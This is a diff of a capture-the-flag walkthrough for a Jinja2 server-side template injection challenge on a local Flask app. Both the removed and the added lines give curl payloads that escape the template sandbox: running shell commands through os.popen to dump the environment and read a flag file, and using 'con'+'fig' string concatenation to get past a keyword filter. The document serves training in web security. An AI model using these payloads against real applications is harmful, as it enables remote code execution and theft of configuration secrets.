@@ -52,20 +52,26 @@ Flag: FLAG{bl1nd_sst1_ch3ck}
 CHALLENGE 4: Sandbox Escape — Object Traversal
 Flag: FLAG{sst1_0bj3ct_tr4v3rs4l}
 
-  The /sandbox endpoint blocks the word "config" (case-insensitive regex).
-  Bypass via Jinja2 object traversal to access config indirectly.
+  The /sandbox endpoint strips the word "config" (case-insensitive regex)
+  from the expression before rendering. Bypass using string concatenation
+  in Python so 'config' never appears as a literal word in the template.
 
-  Using lipsum (Jinja2 global):
-  curl --globoff "http://localhost:5003/sandbox?expr={{lipsum.__globals__['os'].popen('env').read()}}"
+  Key insight: 'con'+'fig' in the template text does NOT contain the
+  substring "config", so it passes the regex. But at Jinja2 runtime,
+  Python evaluates 'con'+'fig' to 'config'.
 
-  Using string class traversal:
-  curl --globoff "http://localhost:5003/sandbox?expr={{''.__class__.__mro__[1].__subclasses__()}}"
+  Working payload (uses getattr + string concat):
+  curl -s --globoff "http://localhost:5003/sandbox?expr={{lipsum.__globals__['__builtins__']['getattr'](lipsum.__globals__['__builtins__']['__import__']('flask').current_app,'con'%2B'fig')['SANDBOX_FLAG']}}"
 
-  Accessing the flag via attribute access without "config":
-  curl --globoff "http://localhost:5003/sandbox?expr={{request.application.__self__._get_data_for_json.__globals__['current_app'].config['SANDBOX_FLAG']}}"
+  Step-by-step breakdown:
+    1. lipsum.__globals__['__builtins__'] → access Python builtins
+    2. ['__import__']('flask') → import Flask module
+    3. .current_app → get the running Flask app
+    4. getattr(app, 'con'+'fig') → access app.config without 'config' literal
+    5. ['SANDBOX_FLAG'] → read the flag
 
-  Or use string concatenation to bypass the word filter:
-  curl --globoff "http://localhost:5003/sandbox?expr={{self.__init__.__globals__['__builtins__']['__import__']('os').popen('cat /app/flag4.txt').read()}}"
+  Alternative: use os.environ if SANDBOX_FLAG were in environment
+  (it's not — it's only in app.config, so getattr is needed).
 
 -------------------------------------------------------------------------------
 
